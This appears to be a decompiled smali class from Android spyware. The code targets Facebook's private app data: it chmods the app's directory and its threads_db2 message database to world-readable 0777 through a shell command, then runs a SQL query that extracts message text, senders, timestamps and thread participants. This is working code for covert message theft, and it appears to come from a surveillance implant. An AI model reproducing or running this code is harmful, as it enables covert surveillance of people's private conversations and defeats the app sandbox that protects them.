.class public final Lcom/network/android/d/a;
.super Lcom/network/android/p;


# static fields
.field static c:Ljava/lang/String;

.field protected static final d:Ljava/util/Map;

.field static final e:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-string v0, "facebook"

    sput-object v0, Lcom/network/android/d/a;->c:Ljava/lang/String;

    new-instance v0, Lcom/network/android/d/b;

    invoke-direct {v0}, Lcom/network/android/d/b;-><init>()V

    sput-object v0, Lcom/network/android/d/a;->d:Ljava/util/Map;

    const-string v1, "timestamp"

    invoke-interface {v0, v1}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    sput-object v0, Lcom/network/android/d/a;->e:Ljava/lang/String;

    return-void
.end method

.method public static a(Landroid/os/Handler;Landroid/content/Context;Z)V
    .locals 12

    :try_start_0
    const-string v0, "getFacebookApp GetContentIM start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v3, "facebook"

    const-string v4, "/data/data/com.facebook.katana/"

    const-string v5, "/data/data/com.facebook.katana/databases/threads_db2"

    const-string v6, "SELECT  messages.msg_id, messages.thread_id,  messages.timestamp_ms,  messages.text, messages.sender, threads.participants from messages INNER JOIN threads ON messages.thread_id=threads.thread_id"

    const-string v7, "messages.timestamp_ms"

    const-string v8, "chmod 0777 /data/data/com.facebook.katana; chmod 0777 /data/data/com.facebook.katana/databases; chmod 0777 /data/data/com.facebook.katana/databases/threads_db2; chmod 0777 /data/data/com.facebook.katana/databases/threads_db2-journal; "

    sget-object v9, Lcom/network/android/d/a;->e:Ljava/lang/String;

    sget-object v10, Lcom/network/android/d/a;->d:Ljava/util/Map;

    const/16 v11, 0xbf0

    move-object v0, p0

    move-object v1, p1

    move v2, p2

    invoke-static/range {v0 .. v11}, Lcom/network/android/d/a;->a(Landroid/os/Handler;Landroid/content/Context;ZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;S)V

    const-string v0, "getFacebookApp GetContentIM end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Lcom/network/android/d/a;->c:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "getFacebookApp GetContentIM exception- "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method
